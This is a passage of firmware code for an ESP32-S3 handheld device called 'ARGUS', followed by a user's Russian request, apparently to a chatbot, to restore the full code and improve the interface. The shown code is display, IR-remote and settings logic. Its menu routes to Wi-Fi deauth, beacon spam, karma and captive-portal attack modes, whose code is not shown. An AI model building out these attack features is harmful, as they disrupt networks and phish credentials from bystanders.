+if (ok) { irSavedList[irSavedCount] = rec; irSavedCount++; }
+}
+if (ok) { beepSuccess(); message("IR Receive", "Saved to SD", nullptr, COL_OK); }
+else if (!sdReady) { beepError(); message("IR Receive", "SD not ready", "code not saved", COL_WARN); }
+else if (irSavedCount >= IR_SAVED_MAX) { beepError(); message("IR Receive", "Saved list full", nullptr, COL_WARN); }
+else { beepError(); message("IR Receive", "SD write failed", nullptr, COL_WARN); }
+delay(600);
+screen = IR_MENU;
+}
+if (millis() - irLastReceive > 6000) drawIrReceiveScreen();
+}
+
+// ================= IR SAVED =================
+void drawIrSaved() {
+clearScreen(); header("Saved IR", 1);
+if (!sdReady) {
+centerText("SD card required", 55, COL_WARN);
+centerText("for saved codes", 75, COL_DIM);
+centerText("BACK: return", 105, COL_DIM);
+return;
+}
+if (irSavedCount == 0) {
+centerText("No saved codes", 50, COL_ACCENT2);
+centerText("Receive an IR code", 70, COL_DIM);
+centerText("then SELECT to save", 82, COL_DIM);
+centerText("BACK: return", 108, COL_DIM);
+return;
+}
+const int visible = 5;
+int first = irSavedIdx - visible / 2;
+if (first < 0) first = 0;
+if (irSavedCount <= visible) first = 0;
+else if (first > irSavedCount - visible) first = irSavedCount - visible;
+for (int row = 0; row < visible; row++) {
+int idx = first + row; if (idx >= irSavedCount) break;
+menuItem(32 + row * 16, irSavedList[idx].name, idx == irSavedIdx);
+}
+const SavedIRCommand& sel = irSavedList[irSavedIdx];
+String proto = typeToString((decode_type_t)sel.protocol, false);
+char info[32]; snprintf(info, sizeof(info), "%s  %u bit", proto.c_str(), sel.bits);
+text(info, 4, 112, COL_ACCENT2);
+char pos[12]; snprintf(pos, sizeof(pos), "%d/%d", irSavedIdx + 1, irSavedCount);
+text(pos, 128, 120, COL_DIM);
+text("NEXT", 4, 120, COL_DIM);
+text("SELECT SEND", 38, 120, COL_DIM);
+if (irToastUntil > millis()) {
+tft.fillRoundRect(20, 45, 120, 38, 5, COL_OK);
+text("SENT", 61, 51, COL_BG, 2);
+}
+}
+void tickIrSaved(bool entered) {
+if (entered) { sdLoadSavedIR(); irSavedIdx = 0; drawIrSaved(); }
+if (backPressed()) { screen = IR_MENU; return; }
+if (!sdReady || irSavedCount == 0) return;
+if (nextPressed()) { irSavedIdx = (irSavedIdx + 1) % irSavedCount; drawIrSaved(); }
+if (selectPressed()) {
+if (sendSavedIR(irSavedList[irSavedIdx])) { irToastUntil = millis() + 700; drawIrSaved(); }
+}
+if (irToastUntil != 0 && millis() >= irToastUntil) { irToastUntil = 0; drawIrSaved(); }
+}
+
+// ================= SETTINGS / INFO / TEST =================
+void displayTestScreen() {
+clearScreen(); header("Display Test", 3);
+tft.drawRect(8, 30, 44, 30, COL_ACCENT);
+tft.fillRect(58, 30, 44, 30, COL_ACCENT);
+tft.fillRect(108, 30, 44, 30, COL_ACCENT2);
+tft.drawRect(8, 68, 144, 35, COL_ACCENT);
+tft.fillCircle(30, 85, 10, COL_ACCENT);
+tft.drawCircle(80, 85, 10, COL_ACCENT2);
+tft.fillCircle(130, 85, 10, COL_ACCENT2);
+}
+void infoScreen() {
+  clearScreen(); header("INFO / SYSTEM",3);
+  if(infoPage==0) {
+    text("BOARD: ESP32-S3",4,29,COL_ACCENT2);
+    text("DISPLAY: ST7735",4,41,COL_TEXT);
+    char b[32];
+    snprintf(b,sizeof(b),"CHIP TEMP: %.1f C",(double)temperatureRead()); text(b,4,53,COL_ACCENT);
+    snprintf(b,sizeof(b),"HEAP: %lu B",(unsigned long)ESP.getFreeHeap()); text(b,4,65,COL_TEXT);
+    snprintf(b,sizeof(b),"MIN HEAP: %lu B",(unsigned long)ESP.getMinFreeHeap()); text(b,4,77,COL_TEXT);
+    snprintf(b,sizeof(b),"PSRAM: %lu B",(unsigned long)ESP.getFreePsram()); text(b,4,89,COL_TEXT);
+    snprintf(b,sizeof(b),"CPU: %u MHz",(unsigned)ESP.getCpuFreqMHz()); text(b,4,101,COL_ACCENT2);
+    snprintf(b,sizeof(b),"FLASH: %lu KB",(unsigned long)(ESP.getFlashChipSize()/1024)); text(b,4,113,COL_TEXT);
+  } else if(infoPage==1) {
+    text("TFT PINS",4,30,COL_ACCENT2);
+    text("CS: GPIO10",4,44,COL_TEXT);
+    text("RST: GPIO8  DC: GPIO9",4,57,COL_TEXT);
+    text("BL: GPIO7",4,70,COL_TEXT);
+    text("SPI SCK: GPIO12",4,83,COL_TEXT);
+    text("MISO: GPIO21",4,96,COL_TEXT);
+    text("MOSI: GPIO11",4,109,COL_TEXT);
+  } else {
+    text("OTHER PINS",4,30,COL_ACCENT2);
+    text("BACK: GPIO15",4,44,COL_TEXT);
+    text("NEXT: GPIO4",4,57,COL_TEXT);
+    text("SELECT: GPIO5",4,70,COL_TEXT);
+    text("BUZZER: GPIO16",4,83,COL_TEXT);
+    text("IR: GPIO1",4,96,COL_TEXT);
+    char sdLine[24];
+    snprintf(sdLine,sizeof(sdLine),"SD CS:13 %s", sdReady ? "READY" : "FAILED");
+    text(sdLine,4,109, sdReady ? COL_OK : COL_WARN);
+  }
+  char pg[12]; snprintf(pg,sizeof(pg),"%d/3",infoPage+1); text(pg,137,119,COL_DIM);
+}
+const int SETTINGS_ITEMS = 4;
+void drawSettingsScreen() {
+clearScreen(); header("Settings", 2);
+char br[32]; snprintf(br, sizeof(br), "Brightness: %d/%d", brightnessLevel + 1, BRIGHTNESS_LEVELS);
+menuItem(34, br, settingsItem == 0);
+char bz[24]; snprintf(bz, sizeof(bz), "Buzzer: %s", buzzerEnabled ? "ON" : "OFF");
+menuItem(52, bz, settingsItem == 1);
+menuItem(70, "WiFi toggle", settingsItem == 2);
+menuItem(88, "Back", settingsItem == 3);
+centerText("NEXT: nav  SELECT: change", 118, COL_DIM);
+}
+void tickSettings(bool entered) {
+if (entered) drawSettingsScreen();
+if (backPressed()) { screen = ARGUS_HUB; return; }
+if (nextPressed()) { settingsItem = (settingsItem + 1) % SETTINGS_ITEMS; drawSettingsScreen(); }
+if (selectPressed()) {
+if (settingsItem == 0) { brightnessLevel = (brightnessLevel + 1) % BRIGHTNESS_LEVELS; applyBrightness(); drawSettingsScreen(); }
+else if (settingsItem == 1) { buzzerEnabled = !buzzerEnabled; if (buzzerEnabled) beepSelect(); drawSettingsScreen(); }
+else if (settingsItem == 2) {
+if (WiFi.getMode() == WIFI_OFF) { WiFi.mode(WIFI_STA); WiFi.disconnect(); }
+else { WiFi.disconnect(true); WiFi.mode(WIFI_OFF); }
+drawSettingsScreen();
+}
+else { screen = ARGUS_HUB; }
+}
+}
+void tickDisplayTest(bool entered) {
+if (entered) displayTestScreen();
+if (backPressed()) screen = ARGUS_HUB;
+}
+void tickInfo(bool entered) {
+  if(entered) infoScreen();
+  if(backPressed()) { screen=ARGUS_HUB; return; }
+  if(nextPressed()) { infoPage=(infoPage+1)%3; infoScreen(); }
+}
+
+// ================= TICK FUNCTIONS =================
+void tickWifiMenu(bool entered) {
+if (entered) drawWiFiMenu();
+if (backPressed()) { screen = MAIN; return; }
+if (nextPressed()) { wifiItem = (wifiItem + 1) % WIFI_ITEMS; drawWiFiMenu(); }
+if (selectPressed()) {
+if (wifiItem == 0) { screen = scanNetworks() ? WIFI_SCAN : WIFI_MENU; if (screen == WIFI_MENU) drawWiFiMenu(); }
+else if (wifiItem == 1) screen = WIFI_STATUS;
+else if (wifiItem == 2) screen = WIFI_HOTSPOT;
+else if (wifiItem == 3) screen = BEACON_SPAM;
+else if (wifiItem == 4) screen = CAPTIVE_PORTAL;
+else if (wifiItem == 5) screen = SNIFFER;
+else if (wifiItem == 6) screen = DEAUTH;
+else if (wifiItem == 7) screen = RADAR;
+else if (wifiItem == 8) screen = DEAUTH_DETECTOR;
+else if (wifiItem == 9) screen = KARMA;
+}
+}
+void tickWifiScan(bool entered) {
+if (entered) drawNetworkList();
+if (backPressed()) { screen = WIFI_MENU; return; }
+if (nextPressed() && networkCount > 0) { networkItem = (networkItem + 1) % networkCount; drawNetworkList(); }
+if (selectPressed()) { screen = WIFI_INFO; }
+}
+void tickWifiInfo(bool entered) {
+if (entered) showNetworkInfo(networkItem);
+if (backPressed()) { screen = WIFI_SCAN; return; }
+if (selectPressed()) { connectOpenNetwork(networkItem); screen = WIFI_SCAN; }
+}
+void tickWifiStatus(bool entered) {
+if (entered) showWiFiStatus();
+if (backPressed()) screen = WIFI_MENU;
+}
+
+// ================= SETUP & LOOP =================
+void setup() {
+Serial.begin(115200);
+delay(200);
+
+rgbLed.begin();
+rgbLed.setBrightness(70);
+rgbLed.clear();
+rgbLed.show();
+
+pinMode(BTN_BACK, INPUT_PULLUP);
+pinMode(BTN_NEXT, INPUT_PULLUP);
+pinMode(BTN_SELECT, INPUT_PULLUP);
+pinMode(TFT_BL, OUTPUT);
+pinMode(TFT_CS, OUTPUT);
+pinMode(SD_CS, OUTPUT);
+pinMode(BUZZER_PIN, OUTPUT);
+pinMode(IR_PIN, OUTPUT);
+digitalWrite(TFT_CS, HIGH);
+digitalWrite(SD_CS, HIGH);
+digitalWrite(IR_PIN, LOW);
+
+SPI.begin(12, 21, 11, -1);
+
+ledcAttach(BUZZER_PIN, 2000, 10);
+
+tft.initR(INITR_BLACKTAB);
+tft.setRotation(1); // Flipped to the opposite landscape orientation
+tft.setTextWrap(false);
+applyBrightness();
+
+clearScreen(COL_BG);
+// Clean ARGUS boot screen: no eye animation, orange monochrome only.
+tft.fillScreen(COL_BG);
+tft.setTextColor(COL_ACCENT);
+tft.setTextSize(3);
+tft.setCursor(22, 36);
+tft.print("ARGUS");
+tft.setTextSize(1);
+tft.setTextColor(COL_ACCENT2);
+tft.setCursor(56, 66);
+tft.print("SYSTEM v2.0");
+tft.drawRoundRect(12, 94, 136, 8, 3, COL_ACCENT);
+for (int progress = 0; progress <= 128; progress += 8) {
+  tft.fillRoundRect(16, 97, progress, 2, 1, COL_ACCENT2);
+  delay(18);
+}
+delay(120);
+
+// SD init happens after the TFT is fully up and done drawing, so the
+// shared SPI bus is never touched by both devices at once. A missing or
+// failed card is reported in Serial and on the INFO screen; nothing here
+// blocks or loops waiting for a card.
+sdInit();
+
+irsend.begin();
+irrecv.enableIRIn();
+irrecv.disableIRIn();
+
+WiFi.mode(WIFI_STA);
+WiFi.disconnect();
+
+randomSeed(micros());
+playBootMelody();
+delay(500);
+
+screen = MAIN;
+prevScreen = MAIN;
+screenEntered = true;
+}
+
+void loop() {
+bool entered = screenEntered;
+screenEntered = false;
+
+switch (screen) {
+case MAIN:              tickMain(entered);              break;
+case WIFI_MENU:         tickWifiMenu(entered);          break;
+case WIFI_SCAN:         tickWifiScan(entered);          break;
+case WIFI_INFO:         tickWifiInfo(entered);          break;
+case WIFI_STATUS:       tickWifiStatus(entered);        break;
+case WIFI_HOTSPOT:      tickHotspot(entered);           break;
+case BEACON_SPAM:       tickBeaconSpam(entered);        break;
+case CAPTIVE_PORTAL:    tickCaptivePortal(entered);     break;
+case SNIFFER:           tickSniffer(entered);           break;
+case DEAUTH:            tickDeauth(entered);            break;
+case RADAR:             tickRadar(entered);             break;
+case DEAUTH_DETECTOR:   tickDeauthDetector(entered);    break;
+case KARMA:             tickKarma(entered);             break;
+case IR_MENU:           tickIrMenu(entered);            break;
+case IR_TV_BRANDS:      tickIrBrands(entered);          break;
+case IR_TV_MODELS:      tickIrModels(entered);          break;
+case IR_TV_REMOTE:      tickIrRemote(entered);          break;
+case IR_RECEIVE:        tickIrReceive(entered);         break;
+case IR_SAVED:          tickIrSaved(entered);           break;
+case DISPLAY_TEST:      tickDisplayTest(entered);       break;
+case INFO:              tickInfo(entered);              break;
+case SETTINGS:          tickSettings(entered);          break;
+case ARGUS_HUB:         tickArgusHub(entered);           break;
+case RGB_MENU:          tickRGBMenu(entered);              break;
+ case TETRIS_GAME:       CuteTetris::tick(entered);              break;
+case ARGUS_LINK:        tickArgusLink(entered);                   break;
+
+default:                screen = MAIN;                  break;
+
+}
+
+if (screen != prevScreen) {
+prevScreen = screen;
+screenEntered = true;
+}
+rgbTick();
+delay(5);
+}
+
+Восстанови весь код и переверни экран на противоположную сторону, улушчи интерфейс механику и все сделать красиво все, а то дипсик ничего не умеет
